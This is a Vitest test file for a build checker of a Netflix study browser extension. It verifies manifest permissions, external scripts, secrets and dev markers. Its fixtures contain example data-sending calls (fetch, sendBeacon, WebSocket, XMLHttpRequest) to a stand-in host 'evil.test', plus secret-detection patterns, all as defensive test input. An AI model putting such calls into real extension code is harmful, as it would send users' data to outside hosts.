// @vitest-environment node
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  checkAllScripts,
  checkBuildSecrets,
  checkContentBundles,
  checkTrackedSecrets,
  checkBuildDir,
  checkExtensionPages,
  checkManifest,
  checkShimMarker,
  checkTrackedFiles,
} from './check-build.mjs';

const okManifest = () => ({
  manifest_version: 3,
  name: 'test',
  version: '0.0.0',
  key: 'FAKEPUBLICKEYFORTESTS',
  permissions: ['unlimitedStorage', 'storage', 'identity'],
  content_scripts: [{ matches: ['https://www.netflix.com/*'], js: ['contentLoader.bundle.js'] }],
  web_accessible_resources: [{ resources: ['content.styles.css', 'contentScript.bundle.js'], matches: ['https://www.netflix.com/*'] }],
  action: { default_popup: 'popup.html' },
});

const readerHtml =
  '<!doctype html><html><head><link rel="stylesheet" href="reader.css"><script defer src="/reader.bundle.js"></script></head><body></body></html>';
const popupHtml =
  '<!doctype html><html><head><script defer="defer" src="/popup.bundle.js"></script></head><body></body></html>';

let dir: string;

function write(rel: string, content: string) {
  const full = join(dir, rel);
  mkdirSync(join(full, '..'), { recursive: true });
  writeFileSync(full, content);
}

function makeOkBuild() {
  write('manifest.json', JSON.stringify(okManifest()));
  write('reader.html', readerHtml);
  write('reader.css', 'body { color: black; }');
  write(
    'reader.bundle.js',
    'const u = "https://www.netflix.com/watch/"; console.log(u);'
  );
  write('popup.html', popupHtml);
  write(
    'popup.bundle.js',
    'throw new Error("Minified React error; visit https://reactjs.org/docs/error-decoder.html?invariant=1");'
  );
  write(
    'background.bundle.js',
    'const h = "firestore.googleapis.com"; fetch(`https://identitytoolkit.googleapis.com/v1/accounts`); const p = "https://nf-subtitle-study-21cae.web.app/privacy/";'
  );
  write('contentLoader.bundle.js', 'window.postMessage({ channel: "NF_STUDY_STORE_RESPONSE" }, "*");');
  write('contentScript.bundle.js', 'const u = "https://www.netflix.com/watch/1";');
}

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'check-build-'));
  makeOkBuild();
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

describe('checkBuildDir', () => {
  it('reports no problems for a clean build', () => {
    expect(checkBuildDir(dir)).toEqual([]);
  });

  it('passes a bundle that only holds Netflix URL strings', () => {
    write(
      'reader.bundle.js',
      'const a = "https://www.netflix.com/watch/123"; const b = \'https://www.netflix.com/title/\';'
    );
    expect(checkBuildDir(dir)).toEqual([]);
  });
});

describe('checkManifest', () => {
  it('accepts the expected manifest', () => {
    expect(checkManifest(okManifest())).toEqual([]);
  });

  it('flags an extra permission', () => {
    const m = { ...okManifest(), permissions: ['storage', 'unlimitedStorage', 'identity', 'tabs'] };
    expect(checkManifest(m).join('\n')).toMatch(/permissions/);
  });

  it('flags a missing permission', () => {
    const m = { ...okManifest(), permissions: ['storage'] };
    expect(checkManifest(m).join('\n')).toMatch(/permissions/);
  });

  it('flags host_permissions', () => {
    const m = { ...okManifest(), host_permissions: ['https://www.netflix.com/*'] };
    expect(checkManifest(m).join('\n')).toMatch(/host_permissions/);
  });

  it('allows an empty host_permissions array', () => {
    const m = { ...okManifest(), host_permissions: [] };
    expect(checkManifest(m)).toEqual([]);
  });

  it('flags a missing key', () => {
    const m: Record<string, unknown> = okManifest();
    delete m.key;
    expect(checkManifest(m).join('\n')).toMatch(/key/);
  });

  it('flags chrome_url_overrides', () => {
    const m = { ...okManifest(), chrome_url_overrides: { newtab: 'newtab.html' } };
    expect(checkManifest(m).join('\n')).toMatch(/chrome_url_overrides/);
  });

  it('is reported through checkBuildDir too', () => {
    write('manifest.json', JSON.stringify({ ...okManifest(), permissions: ['storage'] }));
    expect(checkBuildDir(dir).join('\n')).toMatch(/permissions/);
  });
});

describe('checkExtensionPages', () => {
  it('flags an external script in reader.html', () => {
    write(
      'reader.html',
      readerHtml.replace(
        '</head>',
        '<script src="https://cdn.example.com/x.js"></script></head>'
      )
    );
    const problems = checkExtensionPages(dir);
    expect(problems.join('\n')).toMatch(/reader\.html/);
    expect(problems.join('\n')).toMatch(/cdn\.example\.com/);
  });

  it('flags an external stylesheet link', () => {
    write(
      'popup.html',
      popupHtml.replace(
        '</head>',
        '<link rel="stylesheet" href="http://fonts.example.com/a.css"></head>'
      )
    );
    expect(checkExtensionPages(dir).join('\n')).toMatch(/popup\.html/);
  });

  it('flags an external @import in a loaded stylesheet', () => {
    write('reader.css', '@import url(https://fonts.example.com/a.css);');
    expect(checkExtensionPages(dir).join('\n')).toMatch(/reader\.css/);
  });

  it('reports a missing reader.html', () => {
    rmSync(join(dir, 'reader.html'));
    expect(checkExtensionPages(dir).join('\n')).toMatch(/reader\.html 없음/);
  });

  it('reports a missing local file referenced by a page', () => {
    rmSync(join(dir, 'reader.css'));
    expect(checkExtensionPages(dir).join('\n')).toMatch(/reader\.css/);
  });
});

describe('4.10-2 checkAllScripts', () => {
  it('passes connections to Firebase and Google sign-in, and plain links', () => {
    expect(checkAllScripts(dir)).toEqual([]);
  });

  it.each([
    ['fetch', 'fetch("https://evil.test/collect", { method: "POST" });'],
    ['template fetch', 'fetch(`https://evil.test/${id}`);'],
    ['sendBeacon', 'navigator.sendBeacon("https://evil.test/b", data);'],
    ['WebSocket', 'const s = new WebSocket("wss://evil.test/socket");'],
    ['EventSource', 'const s = new EventSource("https://evil.test/events");'],
    ['XMLHttpRequest', 'const x = new XMLHttpRequest(); x.open("POST", "https://evil.test/x");'],
  ])('flags a %s call to a host outside the list, in any bundle', (_name, code) => {
    write('background.bundle.js', code);
    const problems = checkAllScripts(dir).join('\n');
    expect(problems).toMatch(/background\.bundle\.js/);
    expect(problems).toContain('evil.test');
  });

  it('flags an unknown external address even when it is not called directly', () => {
    write('reader.bundle.js', 'const target = "https://evil.test/collect"; send(target);');
    expect(checkAllScripts(dir).join('\n')).toMatch(/목록에 없는 외부 주소 evil\.test/);
  });

  it('flags loading an external script even from a Google host', () => {
    write('background.bundle.js', 'importScripts("https://www.googleapis.com/x.js");');
    expect(checkAllScripts(dir).join('\n')).toMatch(/importScripts/);
  });

  it('allows relative fetches and local scripts', () => {
    write('background.bundle.js', 'fetch("/data.json"); importScripts("local.js");');
    expect(checkAllScripts(dir)).toEqual([]);
  });

  it('is reported through checkBuildDir', () => {
    write('popup.bundle.js', 'fetch("https://evil.test/x");');
    expect(checkBuildDir(dir).join('\n')).toContain('evil.test');
  });
});

describe('4.3-4 checkContentBundles', () => {
  it('passes content bundles without Firebase', () => {
    expect(checkContentBundles(dir)).toEqual([]);
  });

  it.each(['firestore.googleapis.com', 'identitytoolkit', '@firebase/', 'FirebaseError'])(
    'flags %s in a bundle that goes into the Netflix page',
    (marker) => {
      write('contentScript.bundle.js', `const x = "${marker}";`);
      expect(checkContentBundles(dir).join('\n')).toMatch(/contentScript\.bundle\.js/);
      write('contentScript.bundle.js', '');
      write('contentLoader.bundle.js', `/* ${marker} */`);
      expect(checkBuildDir(dir).join('\n')).toMatch(/contentLoader\.bundle\.js: 넷플릭스 페이지 번들에 Firebase/);
    }
  );

  it('does not flag Firebase in the service worker bundle', () => {
    write('background.bundle.js', 'const e = "FirebaseError"; const h = "firestore.googleapis.com";');
    expect(checkContentBundles(dir)).toEqual([]);
  });
});

describe('4.10-3 secrets', () => {
  it('flags a service account key or a client secret in the build', () => {
    write('background.bundle.js', '{"type":"service_account","private_key":"-----BEGIN"}');
    write('options.bundle.js', 'const client_secret = "x";');
    const problems = checkBuildSecrets(dir).join('\n');
    expect(problems).toMatch(/background\.bundle\.js: 서비스 계정 키/);
    expect(problems).toMatch(/options\.bundle\.js: OAuth 클라이언트 보안 비밀/);
    expect(checkBuildDir(dir).join('\n')).toMatch(/private_key/);
  });

  it('checks tracked files but not docs, tests or this script', () => {
    write('src/leak.json', '{"private_key": "x"}');
    write('docs/notes.md', 'never commit "private_key": values');
    write('src/a.test.ts', 'const client_secret = 1;');
    write('scripts/check-build.mjs', '/client_secret/');
    write('src/ok.ts', 'export const a = 1;');
    const files = ['src/leak.json', 'docs/notes.md', 'src/a.test.ts', 'scripts/check-build.mjs', 'src/ok.ts'];
    expect(checkTrackedSecrets(dir, files)).toEqual(['src/leak.json: 서비스 계정 키(private_key)']);
  });

  it('flags the Firebase web settings file and Firebase logs when tracked', () => {
    const problems = checkTrackedFiles(['firebase.config.local.json', 'firestore-debug.log', 'firebase.json']).join('\n');
    expect(problems).toMatch(/Firebase 웹 설정 파일: firebase\.config\.local\.json/);
    expect(problems).toMatch(/Firebase 로그: firestore-debug\.log/);
    expect(problems).not.toMatch(/firebase\.json/);
  });
});

describe('checkShimMarker', () => {
  it.each([
    ['NF_STUDY_DEV_FAKE_AUTH', /가짜 로그인/],
    ['NF_STUDY_E2E_EMULATOR_LOGIN', /E2E/],
    ['Running in emulator mode. Do not use with production credentials.', /에뮬레이터 연결/],
  ])('4.11-3 flags %s', (marker, label) => {
    write('background.bundle.js', `console.info("${marker}");`);
    expect(checkShimMarker(dir).join('\n')).toMatch(label);
  });

  it('flags the dev storage shim marker in any build file', () => {
    write('background.bundle.js', 'var NF_STUDY_DEV_STORAGE_SHIM = true;');
    const problems = checkShimMarker(dir);
    expect(problems.join('\n')).toMatch(/background\.bundle\.js/);
  });

  it('finds the marker in nested folders', () => {
    write('nested/deep/x.js', '/* NF_STUDY_DEV_STORAGE_SHIM */');
    expect(checkShimMarker(dir).join('\n')).toMatch(/x\.js/);
  });

  it('is clean for a normal build', () => {
    expect(checkShimMarker(dir)).toEqual([]);
  });

  it('4.6-3 flags the fake speech marker too', () => {
    write('reader.bundle.js', 'const m = "NF_STUDY_FAKE_SPEECH";');
    expect(checkShimMarker(dir).join('\n')).toMatch(/reader\.bundle\.js.*NF_STUDY_FAKE_SPEECH/);
  });
});

describe('checkTrackedFiles', () => {
  it('accepts ordinary tracked files', () => {
    expect(
      checkTrackedFiles(['package.json', 'src/manifest.json', 'docs/backup.md'])
    ).toEqual([]);
  });

  it('flags a tracked .pem file', () => {
    expect(checkTrackedFiles(['src/a.ts', 'key.pem']).join('\n')).toMatch(/key\.pem/);
  });

  it('flags a tracked .pem file in a subfolder', () => {
    expect(checkTrackedFiles(['secrets/dev.pem']).join('\n')).toMatch(/dev\.pem/);
  });

  it('flags a tracked backup json', () => {
    expect(
      checkTrackedFiles(['nf-study-backup-20261107.json']).join('\n')
    ).toMatch(/nf-study-backup-20261107\.json/);
  });
});
